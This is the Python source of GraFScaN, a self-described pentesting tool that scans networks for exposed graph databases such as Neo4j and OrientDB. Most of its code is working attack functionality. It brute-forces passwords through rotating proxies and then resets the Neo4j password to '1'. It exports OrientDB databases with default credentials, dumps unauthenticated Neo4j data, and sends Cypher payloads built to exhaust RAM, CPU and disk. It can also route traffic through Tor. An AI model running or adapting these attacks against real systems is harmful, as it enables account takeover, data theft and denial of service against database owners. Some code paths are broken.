#!/usr/bin/python
# -*- coding: utf-8 -*-

__author__ = 'Miguel000'

import requests
import sys
import json
import argparse
import ipaddress
import os

import socks
import socket

def banner():
    print(r"""


	------------------------------------------
	|           GraFScaN  - beta 0.1         |
	|					 |
	| Authors: Miguel Hernández (@MiguelHzBz)|
	|	   Alfonso Muñoz (@mindcrypt)    |
	| Version: Beta 0.1	                 |
	|					 |
	| Date: March 3rd, 2017                  |
	------------------------------------------

     A pentesting tool for graph databases
     List of graph database to be analyzed:

          - Neo4j
          - OrientDB
          - ArangoDB
          - AllegroGraph
          - Virtuoso


    """)
def dos_RamCpu(ip,url_query,headers):
	print "Send loop to crash Neo4j..."
	payload_RAM = "{\"statements\":[{\"statement\":\"FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:\"name\"+x, age: x%100}));\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
	requests.post(url_query,data= payload_RAM,headers=headers,timeout=30).json()
def dos_disco2(ip,url_query,headers):
	print "Load huge CSV..."
	payload_CSV = "{\"statements\":[{\"statement\":\"USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
	requests.post(url_query,data=payload_CSV,headers=headers,timeout=10).json()
def dos_disco1(ip,url_query,url_labels,url_props,headers):
	print "Create all posible indexes"
	l = []
	g={}
	labels = requests.get(url_labels,auth=('neo4j', ''),timeout=1 ).json()
	props = requests.get(url_props,auth=('neo4j', ''),timeout=1 ).json()
	for label in labels:
		for prop in props:
			g1 ={}
			g1["statement"] = str("CREATE INDEX ON:"+label+"("+prop+");")
			l.append(g1)
	g["statements"] = l
	requests.post(url_query,json=g,headers=headers)

def bruteForce_Neo4j(ip,dictpassw,dictproxies,headers):
	d = {}
	url_changepassword = "http://"+ ip +":7474/user/neo4j/password"
	data = '{"password":"1"}'
	for i,passw in enumerate(dictpassw):
		proxies = {
  			'http': 'http://'+dictproxies[i%(len(dictproxies)-1)],
		}
		try:
			r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=2, proxies=proxies)
			if (r_pass.status_code == 200):
				print "Password: " + passw
				return passw
		except Exception as e:
			pass

def bruteForce_Orient(ip,dictpassw):

    url_server = "http://"+ip+":2480/server"
    for passw in dictpassw:
		r_server = requests.get(url_server,auth=('root',passw),timeout=1)
		if (r_server.status_code == 200):
			return passw,r_server

def analyzeIP_ArangoDB(ip,args):
	print "Start the ArangoDB module"
	data_report_total = {}
	listports = ['80','8080','8000','5001','5000','8529']
	for port in listports:	
		try:
			url = "http://"+ip+":"+port+"/_api/version"
			r = requests.get(url,timeout=1 )
			if "arango" in r.headers['server'].lower():
				data_report = {}
				data_report['Arango']=True
				data_report['IP']=ip
				data_report['Port']=port
				if (r.status_code == 200):
					r_json = r.json()
					data_report['Auth']= False
					data_report['Version'] = r_json.get('version')
					data_report['License'] = r_json.get('license')
					url_collections = "http://"+ip+":"+port+"/_api/collection"
					url_user = "http://"+ip+":"+port+"/_api/user"
					url_database = "http://"+ip+":"+port+"/_api/database/user"
					try:
						r2 = requests.get(url_collections,timeout=1).json()
						data_report['Collections'] = r2['result']
						r3 = requests.get(url_user,timeout=1).json()
						data_report['User'] = r3['result']
						r4 = requests.get(url_database,timeout=1).json()
						data_report['Databases'] = r4['result']

					except Exception as e:
						print "Error when tried to search more information."
						print e

				else:
					data_report['Auth']=True
				print "Saving report of ArangoDB"
				data_report_total[port]= data_report					
			else:
				print "The ip: " + ip + " isn't a ArangoDB."

		except Exception as e:
			print "The ip: " + ip + " is not a ArangoDB graph database."
			print e	
	return data_report_total


def analyzeIP_Virtuoso(ip,args):
	print "Start the Virtuoso module"
	data_report_total = {}
	listports = ['80','8080','1111','8889','8890','8001']
	for port in listports:	
		try:
			url = "http://"+ip+":"+port+"/conductor"
			r = requests.get(url,timeout=1 )
			if "virtuoso" in r.headers['Server'].lower():
				data_report = {}
				data_report['Virtuoso']=True
				data_report['IP']=ip
				data_report['Port']=port
				print "Saving report of Virtuoso database"
				data_report_total[port]= data_report					
			else:
				print "The ip: " + ip + " isn't a Virtuoso."

		except Exception as e:
			print "The ip: " + ip + " is not a Virtuoso graph database."
			print e	
	return data_report_total

def analyzeIP_Allegro(ip,args):
	print "Start the AllegroGraph module"
	data_report_total = {}
	listports = ['80','8080','10035']
	for port in listports:	
		try:
			url = "http://"+ip+":"+port+"/repositories"
			r = requests.get(url,timeout=1 )
			if "allegro" in r.headers['server'].lower():
				data_report = {}
				data_report['AllegroGraph']=True
				data_report['IP']=ip
				data_report['Port']=port
				data_report['Repositories'] = r.text
				url_catalogs = "http://"+ip+":"+port+"/catalogs"
				url_user = "http://"+ip+":"+port+"/users"
				url_database = "http://"+ip+":"+port+"/roles"
				try:
					r2 = requests.get(url_collections,timeout=1)
					data_report['Catalogs'] = r2.text
					r3 = requests.get(url_user,timeout=1)
					data_report['User'] = r3.text
					r4 = requests.get(url_database,timeout=1)
					data_report['Roles'] = r4.text

				except Exception as e:
					print "Error when tried to search more information."
					print e
				if 'anonymous' in r3.text:
					data_report['Anon_user'] = True
				print "Saving report of AllegroGraph database"
				data_report_total[port]= data_report					
			else:
				print "The ip: " + ip + " isn't a Allegro."

		except Exception as e:
			print "The ip: " + ip + " is not a Allegro graph database."
			print e	
	
	return data_report_total

def analyzeIP_Orient(ip,args):
	print "Start the Orientdb module "	
	data_report = {}
	try:
		url = "http://"+ip+":2480/listDatabases"
		r = requests.get(url,auth=('neo4j', ''),timeout=1 )
		if "orientdb" in r.headers['server'].lower():
			data_report['ip'] = ip
			data_report['version_OrientdB'] = r.headers['server']
			if (r.status_code == 200):
				json_response = r.json()
				''' Required pass of root to get server information '''			
				if args.bruteForce == True:
					p,infoServer = bruteForce_Orient(ip,args.listPassw)
		    			data_report['server_pass'] = p
					data_report['server_info'] = infoServer.json()
				data_report['auth'] = False
				data_report['databases'] = json_response.get("databases")
				databases = json_response.get("databases")
				for database in databases:		
					url_database = "http://"+ip+":2480/export/"+database
					defaultPass=['admin','reader','writer']
					for dPass in defaultPass:
						r_data = requests.get(url_database,stream=True,auth=(dPass,dPass),timeout=1)
						if (r_data.status_code == 200):
							if not os.path.exists(ip):
	    							os.makedirs(ip)
							with open(ip+"/"+database+'.gz', 'wb') as out_file:
								shutil.copyfileobj(r_data.raw, out_file)
						break;
				data_report['ip'] = ip
				print "Saving report of OrientDB"
				
			else:
				data_report['auth'] = True
				print "The ip: " + ip + " is a OrientDB but not auth."
		return data_report

	except Exception as e:
		print "The ip: " + ip + " is not a OrientDB graph database."
		print e	


def analyzeIP_Neo4j(ip,args):
	
	print "Start the Neo4j module "
	data_report = {}
	try:
		url = "http://"+ip+":7474/db/data"
		r = requests.get(url,auth=('neo4j', ''),timeout=1 )
		if r.status_code == 200:
			json_response = r.json()
			data_report['version'] = json_response.get("neo4j_version")
			print "This IP has a Neo4j graph database."
			data_report['ip'] = ip
			url_license = "http://" + ip + ":7474/db/manage/server/version"
			data_report['license'] = requests.get(url_license,auth=('neo4j', ''),timeout=1 ).json()

			''' Query to get the stadistic of graph database '''
			url_data = "http://"+ ip +":7474/db/manage/server/jmx/query"
			payload = "[\"org.neo4j:instance=kernel#0,name=Primitive count\",\"org.neo4j:instance=kernel#0,name=High Availability\"]"
			headers = {
			    'content-type': "application/json",
			    'accept': "application/json"
			    }
			response = requests.request("POST", url_data, data=payload, headers=headers)
			data_report['NumNodes'] = response.json()[0].get("attributes")[0].get("value")
			data_report['NumRelationships'] = response.json()[0].get("attributes")[3].get("value")
			data_report['NumProperties'] = response.json()[0].get("attributes")[1].get("value")

			''' Query to get Labels and type data '''
			url_labels = "http://" + ip + ":7474/db/data/labels"
			url_types = "http://" + ip + ":7474/db/data/relationship/types"
			url_props = "http://" + ip + ":7474/db/data/propertykeys"
			data_report['labels'] = requests.get(url_labels,auth=('neo4j', ''),timeout=1 ).json()
			data_report['types'] = requests.get(url_types,auth=('neo4j', ''),timeout=1 ).json()
	    		data_report['props'] = requests.get(url_props,auth=('neo4j', ''),timeout=1 ).json()			
					
			''' Query to get some data of the graph database '''
			url_query = "http://" + ip + ":7474/db/data/transaction/commit"
			if args.limit == False:
				payload = "{\"statements\":[{\"statement\":\"match (n) return n limit 20\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
			else:
				payload = "{\"statements\":[{\"statement\":\"match (n) return n\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
			data_report['info'] = requests.post(url_query,data=payload,headers=headers).json()
				
			''' Part of a cluster '''
			url_cluster_avalaible = "http://" + ip + ":7474/db/manage/server/ha/available"
			cluster_response = requests.get(url_cluster_avalaible,headers=headers,timeout=1)
			if (cluster_response.status_code == 200):
				data_report['cluster'] = True
				url_cluster_type = "http://" + ip + ":7474/db/manage/server/ha/master"
				if (url_cluster_type.text.encode('utf-8') == "true"):
				    data_report['cluster_type'] = "Master"
				else:
				    data_report['cluster_type'] = "Slave"
			else:
				data_report['cluster'] = False
				
			''' DoS to the Neo4j '''
			if args.DoS == True:
				try:
					print "DoS attack"
					dos_disco1(ip,url_query,url_labels,url_props,headers)
					try:
						dos_disco2(ip,url_query,headers)
					except Exception as e:
						pass
					try:
						dos_RamCpu(ip,url_query,headers)
					except Exception as e:
						pass
					print "DoS end"
				except Exception as e:
					print "DoS Error"
					print e
			print "Saving report of Neo4j database"
			return data_report

		elif r.status_code == 401:
			json_response = r.json()
			if (json_response.keys()[0] == "errors"):
				data_report["autenticacion"] = True
				data_report['ip'] = ip
	        		url_webadmin = "http://" + ip + ":7474/webadmin";
	        		headers = {
				     	'content-type': "application/json",
		             		'accept': "application/json",
	               			}
	        		r = requests.get(url_webadmin,headers=headers,timeout=1)
	        		if (r.status_code == 404 or r.status_code == 401):
	            			data_report["version"]= "> 3.X"
	        		elif (r.status_code == 200):
					data_report["version"] = "< 3.X"
					data_report["ip"] = ip
	        		if args.bruteForce == True:
					passwd_old = bruteForce_Neo4j(ip,args.listPassw,args.listProxies,headers)
					r = requests.get(url,auth=('neo4j', '1'),timeout=1)
					if (r.status_code == 200):
						print "New password: 1"
						data_report["change_password"] = "yes"
						data_report["old_passwd"]= passwd_old
			    		else:
						data_report["change_password"] = "no"
				print "Saving report of Neo4j database"
				return data_report
			else:
				print "The ip: " + ip + " is not a Neo4j graph database."
		else:
			print "The ip: " + ip + " is not a Neo4j graph database."

	except Exception as e:
		print e


def getArguments(args):
	listIps=list()
    	listPassw=list()
	listProxies=list()
	arguments={}
	parser = argparse.ArgumentParser(description='GraFScaN analyses the input to search differents graph databases. Actually analyses Neo4j, OrientDB, ArangoDB, AllegroGraph and VirtuosoDB')
	parser.add_argument('-neo4j', dest='neo4j', action='store_true', help='Discover and analyze Neo4j Graph database')
	parser.add_argument('-orient', dest='orient', action='store_true', help='Discover and analyze Orient Graph Database')
	parser.add_argument('-arango', dest='arango', action='store_true', help='Discover and analyze Arango Graph Database')
	parser.add_argument('-virtuoso', dest='virtuoso', action='store_true', help='Discover and analyze virtuoso Graph Database')
	parser.add_argument('-allegro', dest='allegro', action='store_true', help='Discover and analyze allegro Graph Database')
	parser.add_argument('-all', dest='all', action='store_true', help='Discover and analyze All Graph Database')	

	parser.add_argument('-ip', dest='ip', help='IP target to analyse.')
	parser.add_argument('-n','--network', dest='net', help='Network target to analyse.')
	parser.add_argument('-i', dest='fileinput', help='List of targets (IPs). One IP per line.')
	parser.add_argument("-o", dest='output', help="Output file", default="report.json")

	parser.add_argument('-b','--bruteforce', dest='bruteForce',action='store_true', help='Brute-force login attack.')
    	parser.add_argument("-dict", dest='dict', help="Dictionary file, one password per line.", default="dict")
	parser.add_argument("-proxies", dest='proxies', help="Proxies file, format: <ip>:<port>.", default="proxies")
	parser.add_argument('-nl', '--no-limit', dest='limit', action='store_true',help='Option to dump all database of Neo4j without auth.')
	parser.add_argument('-tor', dest='tor', action='store_true',help='Connect to the graph database target through Tor (previously executed).')
	parser.add_argument('-DoS', dest='DoS',action='store_true', help='DoS attacks. Currently, Neo4j without authentication.')
	

	args = parser.parse_args()

    	if not args.ip and not args.fileinput and not args.net:
		print "--------------"
		print "Error in input arguments: "
		print "Need one type of input, -i -ip or -n/--network"
		print "--------------"
		print parser.print_help()
		sys.exit(-1)
	elif not args.neo4j and not args.orient and not args.arango and not args.virtuoso and not args.allegro and not args.all:
		print "--------------"
		print "Error in input arguments: "		
		print "Need -neo4j, -orient, -arango, -virtuoso, -allegro or -all argument"
		print "--------------"
		print parser.print_help()
		sys.exit(-1)
	else:
		if args.ip:
			listIps.append(args.ip)
		if args.net:
			try:
				listIps = list(ipaddress.ip_network(unicode(args.net)).hosts())
			except Exception as e:
				print "--------------"
				print "Wrong value of the input network.\n\n"
				print "--------------"
				print parser.print_help()
				sys.exit(-1)
		if args.fileinput:
			try:
				f = open(args.fileinput, 'r')
				for line in f:
					listIps.append(line.strip())
			except Exception as e:
				print "--------------"
				print "Wrong input file.\n\n"
				print "--------------"
				print parser.print_help()
				sys.exit(-1)

		if args.bruteForce:
			try:
			    f = open(args.dict, 'r')
			    for line in f:
				listPassw.append(line.strip())	
			    args.listPassw = listPassw			
			except Exception as e:
			    print "--------------"
			    print "Wrong dict file.\n\n"
			    print "--------------"
			    print parser.print_help()
			    sys.exit(-1)
			if args.neo4j:
				try:
					f = open(args.proxies, 'r')
			    		for line in f:
						listProxies.append(line.strip())
					args.listProxies = listProxies
				except Exception as e:
					print "--------------"			    
					print "Wrong proxies file.\n\n"
					print "--------------"			    		
					print parser.print_help()
			    		sys.exit(-1)
	args.listIps = listIps
	return args

def main():
	banner()
	results = []
	args = getArguments(sys.argv)
	print "Start the analyze: "
	if args.tor == True:
		    socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
		    socket.socket = socks.socksocket
	for ip in args.listIps:
		print "IP: " + ip
		print "-----------------------"
		if args.all:
			dataN = analyzeIP_Neo4j(str(ip),args)
			if dataN:
				results.append(dataN)
			dataO = analyzeIP_Orient(str(ip),args)
			if dataO:
				results.append(dataO)
			dataA = analyzeIP_ArangoDB(str(ip),args)
			if dataA:
				results.append(dataA)
			dataV = analyzeIP_Virtuoso(str(ip),args)
			if dataV:
				results.append(dataV)
			dataAl = analyzeIP_Allegro(str(ip),args)
			if dataAl:
				results.append(dataAl)
		elif args.neo4j:
			data = analyzeIP_Neo4j(str(ip),args)
			if data:
				results.append(data)
		elif args.orient:
			data = analyzeIP_Orient(str(ip),args)
			if data:
				results.append(data)
		elif args.arango:
			data = analyzeIP_ArangoDB(str(ip),args)
			if data:
				results.append(data)
		elif args.virtuoso:
			data = analyzeIP_Virtuoso(str(ip),args)
			if data:
				results.append(data)
		elif args.allegro:
			data = analyzeIP_Allegro(str(ip),args)
			if data:
				results.append(data)	
		else:
			print "Error with arguments"
	if results:
		print "Writting the results in the output file: " + args.output
		fileout = open(args.output, "w")
		json_str = json.dumps(results)
		fileout.write(json_str)
		fileout.close()
	else:
		print "-----------"
		print "No results"

if __name__ == "__main__":
	main()

